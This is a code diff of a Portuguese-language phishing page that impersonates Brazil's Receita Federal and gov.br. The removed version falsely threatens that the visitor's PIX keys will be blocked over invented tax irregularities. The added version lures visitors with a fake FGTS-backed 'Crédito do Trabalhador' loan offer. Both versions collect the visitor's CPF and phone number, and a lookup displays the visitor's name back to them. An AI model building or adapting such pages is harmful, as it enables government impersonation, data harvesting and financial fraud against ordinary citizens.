@@ -473,35 +473,35 @@
     <div class="container">
         <div class="info-box">
             <div class="initial-content">
-                <h2>Verificação de Débitos - Receita Federal</h2>
-                <p>Para consultar possíveis débitos junto à Receita Federal e evitar o bloqueio das suas chaves PIX, insira seu CPF no campo abaixo.</p>
-                <p>A consulta é rápida e segura. O sistema verificará automaticamente a existência de pendências tributárias que possam afetar suas operações PIX.</p>
+                <h2>Programa Crédito do Trabalhador</h2>
+                <p>Consulte seu limite de empréstimo disponível com condições especiais baseadas no seu FGTS. Juros reduzidos e facilidade de pagamento.</p>
+                <p>Empréstimo com desconto direto no FGTS. Sem comprometer seu salário, sem burocracia. Digite seu CPF para consultar valores disponíveis.</p>
             </div>
             <div class="cpf-form" id="cpfFormContainer">
                 <input type="tel" id="cpfInput" class="cpf-input" placeholder="Digite seu CPF" pattern="\d*" maxlength="14">
                 <button id="verifyButton" class="submit-button">
                     <i class="fas fa-search"></i>
-                    Realizar Consulta
+                    Consultar Valor Disponível
                 </button>
             </div>
         </div>
     </div>
 
     <footer class="footer">
-        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/11/Gov.br_logo.svg" alt="Receita Federal Logo" class="footer-logo">
         <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
     </footer>
 
     <div id="phoneModal" class="phone-modal">
         <div class="phone-modal-content">
             <div class="phone-modal-header">
-                Atualização Cadastral
+                Confirmação do Empréstimo
             </div>
             <div class="phone-modal-body">
-                <p style="margin-bottom: 15px;">Para prosseguir com a regularização, precisamos confirmar seu telefone:</p>
+                <p style="margin-bottom: 15px;">Para prosseguir com a contratação do empréstimo, informe seu telefone para contato:</p>
                 <input type="tel" id="phoneInput" class="phone-input" placeholder="(XX) XXXXX-XXXX" maxlength="15">
                 <button id="continueButton" class="continue-button">
-                    Continuar
+                    Solicitar Empréstimo
                 </button>
             </div>
         </div>
@@ -611,37 +611,37 @@
                                 {
                                     text: "Iniciando análise do CPF...",
                                     icon: "search",
-                                    details: "Verificando dados básicos do contribuinte"
+                                    details: "Verificando dados básicos do trabalhador"
                                 },
                                 {
-                                    text: "Analisando transferências PIX desde 2019...",
-                                    icon: "exchange-alt",
-                                    details: "Verificando histórico detalhado de transações"
+                                    text: "Verificando histórico profissional...",
+                                    icon: "briefcase",
+                                    details: "Consultando vínculos empregatícios e estabilidade"
                                 },
                                 {
-                                    text: "Verificando movimentações financeiras desde 2020...",
-                                    icon: "chart-line",
-                                    details: "Análise profunda de padrões financeiros"
+                                    text: "Analisando saldo do FGTS disponível...",
+                                    icon: "piggy-bank",
+                                    details: "Calculando valores disponíveis para empréstimo"
                                 },
                                 {
-                                    text: "Consultando declarações de Imposto de Renda...",
-                                    icon: "file-invoice-dollar",
-                                    details: "Validação completa de declarações anteriores"
+                                    text: "Verificando tempo de serviço...",
+                                    icon: "calendar-check",
+                                    details: "Analisando estabilidade e continuidade no trabalho"
                                 },
                                 {
-                                    text: "Analisando registros de Cartão de Crédito...",
-                                    icon: "credit-card",
-                                    details: "Avaliação detalhada de gastos e limites"
+                                    text: "Calculando capacidade de pagamento...",
+                                    icon: "calculator",
+                                    details: "Avaliando valores seguros para desconto no FGTS"
                                 },
                                 {
-                                    text: "Verificando histórico de declarações tributárias...",
-                                    icon: "file-contract",
-                                    details: "Análise de documentos fiscais e obrigações"
+                                    text: "Simulando opções de empréstimo...",
+                                    icon: "money-bill-wave",
+                                    details: "Preparando propostas personalizadas com taxas reduzidas"
                                 },
                                 {
-                                    text: "Consultando lista de restrições da Receita Federal...",
-                                    icon: "exclamation-triangle",
-                                    details: "Verificação final de status e pendências"
+                                    text: "Finalizando análise de crédito...",
+                                    icon: "check-circle",
+                                    details: "Preparando resultado final da consulta"
                                 }
                             ];
 
@@ -682,41 +682,114 @@
                             amanha.setDate(amanha.getDate() + 1);
                             const dataFormatada = amanha.toLocaleDateString('pt-BR');
 
+                            // Cálculos para empréstimos
+                            // Opção 1: R$ 4.000,00 com parcela máxima de R$ 48,00
+                            const valor1 = 4000;
+                            const parcela1 = 48;
+                            const meses1 = Math.ceil(valor1 / parcela1 * 1.019); // Considerando juros de 1,9% ao mês
+                            
+                            // Opção 2: R$ 6.000,00 com parcela máxima de R$ 68,00
+                            const valor2 = 6000;
+                            const parcela2 = 68;
+                            const meses2 = Math.ceil(valor2 / parcela2 * 1.019);
+                            
+                            // Opção 3: R$ 10.000,00 com parcela máxima de R$ 118,00
+                            const valor3 = 10000;
+                            const parcela3 = 118;
+                            const meses3 = Math.ceil(valor3 / parcela3 * 1.019);
+                            
                             loadingContainer.innerHTML = `
                                 <div class="user-details">
                                     <strong>Nome: ${data.DADOS.nome}</strong>
                                     <strong>CPF: ${cpf}</strong>
                                 </div>
 
-                                <div class="irregularities">
-                                    <div class="irregularity-title">Pendências identificadas junto à Receita Federal:</div>
-
-                                    <div class="irregularity-item">
-                                        <strong>Ano 2023</strong>
-                                        <div style="margin-top: 8px;">
-                                            • Divergências na declaração de renda<br>
-                                            • Inconsistências nos valores declarados
-                                        </div>
+                                <div style="margin: 25px 0; padding: 15px; background-color: #f0f8ff; border-left: 4px solid #1351b4; border-radius: 4px;">
+                                    <div style="font-weight: 600; font-size: 18px; color: #1351b4; margin-bottom: 10px;">
+                                        Análise de crédito concluída
                                     </div>
-
-                                    <div class="irregularity-item">
-                                        <strong>Ano 2024</strong>
-                                        <div style="margin-top: 8px;">
-                                            • Movimentações financeiras incompatíveis<br>
-                                            • Transações não declaradas identificadas
-                                        </div>
-                                    </div>
+                                    <p style="margin-bottom: 10px;">
+                                        Com base no seu histórico profissional e saldo do FGTS, você tem direito a 
+                                        condições especiais no <strong>Programa Crédito do Trabalhador</strong>.
+                                    </p>
+                                    <p>
+                                        <strong>Taxa de juros:</strong> 1,9% ao mês<br>
+                                        <strong>Forma de pagamento:</strong> Desconto direto no FGTS todo dia 10<br>
+                                        <strong>Vantagens:</strong> Sem comprometer seu salário, sem consulta ao SPC/Serasa
+                                    </p>
                                 </div>
 
-                                <p class="warning-message">
-                                    Comunicamos que, devido às irregularidades identificadas, o contribuinte estará na Lista de Bloqueio da Receita Federal a partir de ${dataFormatada}. Todas as chaves PIX serão bloqueadas, impossibilitando a realização e recebimento de transferências via PIX.
-                                </p>
+                                <h3 style="text-align: center; margin: 25px 0 15px; font-size: 18px; color: #1351b4;">
+                                    Opções de Empréstimo Disponíveis
+                                </h3>
 
-                                <button onclick="showPhoneModal()" class="regularize-button">
-                                    <i class="fas fa-exclamation-triangle"></i>
-                                    Regularizar meu CPF
-                                </button>
+                                <div style="display: flex; flex-direction: column; gap: 15px; margin-bottom: 30px;">
+                                    <!-- Opção 1 -->
+                                    <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
+                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                                            <div style="font-weight: 600; font-size: 20px; color: #1351b4;">R$ 4.000,00</div>
+                                            <div style="background-color: #e6f0ff; color: #1351b4; padding: 5px 10px; border-radius: 4px; font-size: 14px; font-weight: 600;">
+                                                Básico
+                                            </div>
+                                        </div>
+                                        <div style="margin-bottom: 15px;">
+                                            <div><strong>Parcela máxima:</strong> R$ 48,00 mensais</div>
+                                            <div><strong>Prazo total:</strong> ${meses1} meses</div>
+                                            <div><strong>Desconto direto no FGTS:</strong> Sim</div>
+                                        </div>
+                                        <button class="select-loan" data-value="4000" style="width: 100%; padding: 10px; background-color: #1351b4; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+                                            <i class="fas fa-check-circle"></i> Selecionar
+                                        </button>
+                                    </div>
+                                    
+                                    <!-- Opção 2 -->
+                                    <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
+                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                                            <div style="font-weight: 600; font-size: 20px; color: #1351b4;">R$ 6.000,00</div>
+                                            <div style="background-color: #e6f0ff; color: #1351b4; padding: 5px 10px; border-radius: 4px; font-size: 14px; font-weight: 600;">
+                                                Intermediário
+                                            </div>
+                                        </div>
+                                        <div style="margin-bottom: 15px;">
+                                            <div><strong>Parcela máxima:</strong> R$ 68,00 mensais</div>
+                                            <div><strong>Prazo total:</strong> ${meses2} meses</div>
+                                            <div><strong>Desconto direto no FGTS:</strong> Sim</div>
+                                        </div>
+                                        <button class="select-loan" data-value="6000" style="width: 100%; padding: 10px; background-color: #1351b4; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+                                            <i class="fas fa-check-circle"></i> Selecionar
+                                        </button>
+                                    </div>
+                                    
+                                    <!-- Opção 3 -->
+                                    <div style="border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
+                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                                            <div style="font-weight: 600; font-size: 20px; color: #1351b4;">R$ 10.000,00</div>
+                                            <div style="background-color: #e6f0ff; color: #1351b4; padding: 5px 10px; border-radius: 4px; font-size: 14px; font-weight: 600;">
+                                                Premium
+                                            </div>
+                                        </div>
+                                        <div style="margin-bottom: 15px;">
+                                            <div><strong>Parcela máxima:</strong> R$ 118,00 mensais</div>
+                                            <div><strong>Prazo total:</strong> ${meses3} meses</div>
+                                            <div><strong>Desconto direto no FGTS:</strong> Sim</div>
+                                        </div>
+                                        <button class="select-loan" data-value="10000" style="width: 100%; padding: 10px; background-color: #1351b4; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer;">
+                                            <i class="fas fa-check-circle"></i> Selecionar
+                                        </button>
+                                    </div>
+                                </div>
+                                
+                                <p style="text-align: center; color: #666; font-size: 14px; margin-bottom: 20px;">
+                                    Selecione uma opção acima para prosseguir com a contratação do empréstimo.
+                                </p>
                             `;
+                            
+                            // Adicionar eventos aos botões de seleção
+                            document.querySelectorAll('.select-loan').forEach(button => {
+                                button.addEventListener('click', () => {
+                                    showPhoneModal();
+                                });
+                            });
                         });
                     }
                 } catch (error) {
